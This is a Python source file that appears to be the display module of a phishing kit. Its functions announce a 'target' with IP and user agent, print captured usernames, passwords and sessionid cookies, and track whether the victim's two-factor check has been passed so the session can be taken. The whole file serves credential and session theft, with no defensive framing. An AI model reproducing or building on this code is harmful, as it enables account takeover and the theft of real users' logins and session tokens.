import json
from colorama import Fore, Style

def capture_information(filename, n):
    with open(filename, 'r') as f:
        lines = f.readlines()
    last_lines = lines[-n:]
    filtered_lines =  [line for line in last_lines if line.strip()]
    filtered_lines_str = ""
    for line in filtered_lines:
        if "Username" in line:
            filtered_lines_str += "--------------------------------------\n"
        filtered_lines_str += line 
    filtered_lines_str += "--------------------------------------"
    return filtered_lines_str


def edit_cookies(cookies):
    cookies = json.loads(cookies)
    new_cookies =  f"\nsessionid:  {cookies['sessionid']}"
    return new_cookies


def first_art(visit_time, user_ip, user_agent):
    user_agent = user_agent
    message = f"""{Style.BRIGHT}{Fore.YELLOW}
            Target detected!!
 --------------------------------------------
|Enter website in: {Fore.GREEN}{visit_time}                                               
{Fore.YELLOW} --------------------------------------------
|IP:~~~~~~~~~~~~~~ {Fore.GREEN}{user_ip}                                                              
{Fore.YELLOW} --------------------------------------------
|User-Agent:~~~~~~ {Fore.GREEN}{user_agent}
{Fore.YELLOW}---------------------------------------------"""
    print(message)


def correct_all(username,password,cookies):
    cookies = cookies.strip().split()
    message = f"""{Style.BRIGHT}{Fore.GREEN}
            Successful login
{Fore.YELLOW} --------------------------------------------
| Username:   {Fore.GREEN}{username}                                               
{Fore.YELLOW} --------------------------------------------
| Password:   {Fore.GREEN}{password}                                                              
{Fore.YELLOW} --------------------------------------------
| sessionid:  {Fore.GREEN}{cookies[1]}
{Fore.YELLOW}---------------------------------------------"""
    print(message)


def wrong_answer(username,password):
    message = f"""{Style.BRIGHT}{Fore.RED}
            Username or Password wrong
{Fore.YELLOW} --------------------------------------------
| Username:   {Fore.RED}{username}                                               
{Fore.YELLOW} --------------------------------------------
| Password:   {Fore.RED}{password}                                                              
{Fore.YELLOW} --------------------------------------------"""
    print(message)


def twoFA_active(username,password):
    message = f"""{Style.BRIGHT}{Fore.YELLOW}
        Username and Password are correct but 2FA is active.
{Fore.YELLOW} --------------------------------------------
| Username:   {Fore.GREEN}{username}                                               
{Fore.YELLOW} --------------------------------------------
| Password:   {Fore.GREEN}{password}                                                              
{Fore.YELLOW} --------------------------------------------

        Waiting for two-factor verification...
"""
    print(message)

def twoFA_correct(cookies):
    cookies = cookies.strip().split()
    message = f"""{Style.BRIGHT}{Fore.GREEN}
        Two-factor verification completed.
{Fore.YELLOW} --------------------------------------------
| Sessionid:   {Fore.GREEN}{cookies[1]}                                               
{Fore.YELLOW} --------------------------------------------"""
    print(message)
